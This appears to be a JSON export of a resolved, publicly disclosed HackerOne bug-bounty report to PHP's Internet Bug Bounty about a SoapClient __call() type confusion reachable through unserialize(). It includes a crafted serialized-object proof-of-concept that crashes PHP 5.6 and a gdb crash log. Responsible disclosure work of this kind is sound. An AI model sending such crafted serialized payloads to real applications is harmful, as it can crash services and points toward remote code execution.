{"id":55030,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81NTAzMA==","url":"https://hackerone.com/reports/55030","title":"SoapClient's __call() type confusion through unserialize()","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2015-02-19T00:00:00.000Z","submitted_at":"2015-02-19T00:00:00.000Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"cogitoergor00t","url":"/cogitoergor00t","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/020/061/8c7b3fd2883a175ed23e98992225ad21b5033a20_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":29,"url":"https://hackerone.com/ibb-php","handle":"ibb-php","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"paused","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"PHP (IBB)","twitter_handle":"","website":"http://www.php.net","about":""}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2015-03-03T00:00:00.000Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2015-03-03T00:00:00.000Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"https://bugs.php.net/bug.php?id=69085\n\nDescription:\n------------\nSoapClient's __call() method is prone to a type confusion vulnerability which can be used to gain remote code execution through unsafe unserialize() calls.\n\nIn soap.c:2906\n\nif (zend_hash_find(Z_OBJPROP_P(this_ptr), \"__default_headers\", sizeof(\"__default_headers\"), (void **) \u0026tmp)==SUCCESS) {\n       HashTable *default_headers = Z_ARRVAL_P(*tmp);\n\nthe Z_ARRVAL_P macro is called on __default_headers assuming that it is an array without any actual check about it.\n\nIt has been shown several times that this kind of vulnerability could lead to crash, arbitrary read/write memory access and code execution, so I'm not discussing about the actual exploitation of this one (you can refer to my previous submissions about natsort() and extract() if needed by the way).\nHowever, it's worth pointing out that given the nature of __call() magic method, any direct call on a user-controlled userialized input should be considered remotely exploitable.\n\n\nTest script:\n---------------\n\u003c?php\n\n//tested on 64bit Ubuntu PHP 5.6.6\n//crash on memory access violation @1337\n\n$dummy = unserialize('O:10:\"SoapClient\":3:{s:3:\"uri\";s:1:\"a\";s:8:\"location\";s:22:\"http://localhost/a.xml\";s:17:\"__default_headers\";i:1337;}');\nvar_dump($dummy-\u003ewhatever());\n\n?\u003e\n\nActual result:\n--------------\n(gdb) r soapvar.php \nStarting program: /usr/bin/php soapvar.php\n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\n[New Thread 0x7fffec568700 (LWP 13984)]\n[Thread 0x7fffec568700 (LWP 13984) exited]\n\nProgram received signal SIGSEGV, Segmentation fault.\nzend_hash_internal_pointer_reset_ex (ht=ht@entry=0x539, pos=pos@entry=0x0)\n    at /build/buildd/php5-5.6.3+dfsg/Zend/zend_hash.c:1020\n1020\t\t\t*pos = ht-\u003epListHead;\n(gdb) x/i $pc\n=\u003e 0x6e93d3 \u003czend_hash_internal_pointer_reset_ex+3\u003e:\tmov    0x20(%rdi),%rax\n(gdb) p $rdi\n$1 = 1337\n","vulnerability_information_html":"\u003cp\u003e\u003ca title=\"https://bugs.php.net/bug.php?id=69085\" href=\"/redirect?url=https%3A%2F%2Fbugs.php.net%2Fbug.php%3Fid%3D69085\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://bugs.php.net/bug.php?id=69085\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"description\"\u003eDescription:\u003c/h2\u003e\n\n\u003cp\u003eSoapClient\u0026#39;s __call() method is prone to a type confusion vulnerability which can be used to gain remote code execution through unsafe unserialize() calls.\u003c/p\u003e\n\n\u003cp\u003eIn soap.c:2906\u003c/p\u003e\n\n\u003cp\u003eif (zend_hash_find(Z_OBJPROP_P(this_ptr), \u0026quot;\u003cstrong\u003edefault_headers\u0026quot;, sizeof(\u0026quot;\u003c/strong\u003edefault_headers\u0026quot;), (void **) \u0026amp;tmp)==SUCCESS) {\u003cbr\u003e\n       HashTable *default_headers = Z_ARRVAL_P(*tmp);\u003c/p\u003e\n\n\u003cp\u003ethe Z_ARRVAL_P macro is called on __default_headers assuming that it is an array without any actual check about it.\u003c/p\u003e\n\n\u003cp\u003eIt has been shown several times that this kind of vulnerability could lead to crash, arbitrary read/write memory access and code execution, so I\u0026#39;m not discussing about the actual exploitation of this one (you can refer to my previous submissions about natsort() and extract() if needed by the way).\u003cbr\u003e\nHowever, it\u0026#39;s worth pointing out that given the nature of __call() magic method, any direct call on a user-controlled userialized input should be considered remotely exploitable.\u003c/p\u003e\n\n\u003ch2 id=\"test-script\"\u003eTest script:\u003c/h2\u003e\n\n\u003cp\u003e\u0026lt;?php\u003c/p\u003e\n\n\u003cp\u003e//tested on 64bit Ubuntu PHP 5.6.6\u003cbr\u003e\n//crash on memory access violation \u003ca href=\"/1337\"\u003e@1337\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003e$dummy = unserialize(\u0026#39;O:10:\u0026quot;SoapClient\u0026quot;:3:{s:3:\u0026quot;uri\u0026quot;;s:1:\u0026quot;a\u0026quot;;s:8:\u0026quot;location\u0026quot;;s:22:\u0026quot;\u003ca title=\"http://localhost/a.xml%22;s:17:%22__default_headers%22;i:1337;%7D\u0026#39;\" href=\"/redirect?url=http%3A%2F%2Flocalhost%2Fa.xml%2522%3Bs%3A17%3A%2522__default_headers%2522%3Bi%3A1337%3B%257D%27\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://localhost/a.xml%22;s:17:%22__default_headers%22;i:1337;%7D\u0026#39;\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e);\u003cbr\u003e\nvar_dump($dummy-\u0026gt;whatever());\u003c/p\u003e\n\n\u003cp\u003e?\u0026gt;\u003c/p\u003e\n\n\u003ch2 id=\"actual-result\"\u003eActual result:\u003c/h2\u003e\n\n\u003cp\u003e(gdb) r soapvar.php \u003cbr\u003e\nStarting program: /usr/bin/php soapvar.php\u003cbr\u003e\n[Thread debugging using libthread_db enabled]\u003cbr\u003e\nUsing host libthread_db library \u0026quot;/lib/x86_64-linux-gnu/libthread_db.so.1\u0026quot;.\u003cbr\u003e\n[New Thread 0x7fffec568700 (LWP 13984)]\u003cbr\u003e\n[Thread 0x7fffec568700 (LWP 13984) exited]\u003c/p\u003e\n\n\u003cp\u003eProgram received signal SIGSEGV, Segmentation fault.\u003cbr\u003e\nzend_hash_internal_pointer_reset_ex (ht=ht@entry=0x539, pos=pos@entry=0x0)\u003cbr\u003e\n    at /build/buildd/php5-5.6.3+dfsg/Zend/zend_hash.c:1020\u003cbr\u003e\n1020            *pos = ht-\u0026gt;pListHead;\u003cbr\u003e\n(gdb) x/i $pc\u003cbr\u003e\n=\u0026gt; 0x6e93d3 \u0026lt;zend_hash_internal_pointer_reset_ex+3\u0026gt;:    mov    0x20(%rdi),%rax\u003cbr\u003e\n(gdb) p $rdi\u003cbr\u003e\n$1 = 1337\u003c/p\u003e\n","bounty_amount":"2500.0","formatted_bounty":"$2,500","original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":null,"vote_count":0,"voters":[],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1196206,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":null,"markdown_message":"","automated_response":false,"created_at":"2015-03-03T00:00:00.000Z","updated_at":"2016-09-15T13:29:44.258Z","actor":{"url":"/ibb-php","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PHP (IBB)"}},"reporter":{"username":"cogitoergor00t","url":"/cogitoergor00t"},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":8037360,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":null,"markdown_message":"","automated_response":false,"created_at":"2015-04-06T05:11:04.208Z","updated_at":"2020-05-18T15:23:52.400Z","actor":{"url":"/ibb-php","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PHP (IBB)"}},"reporter":{"username":"cogitoergor00t","url":"/cogitoergor00t"},"genius_execution_id":null,"team_handle":"ibb-php","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":372845,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":null,"markdown_message":"","automated_response":false,"created_at":"2015-04-06T05:11:04.240Z","updated_at":"2015-04-06T05:11:04.240Z","actor":{"url":"/ibb-php","ibb":true,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/029/99087dbbdf52fc3ce3acbf16aa33a5c4f5e2c111_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"PHP (IBB)"}},"bounty_amount":"2500.0","bounty_currency":"usd","genius_execution_id":null,"team_handle":"ibb-php","collaborator":{"username":"cogitoergor00t","url":"/cogitoergor00t"},"actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}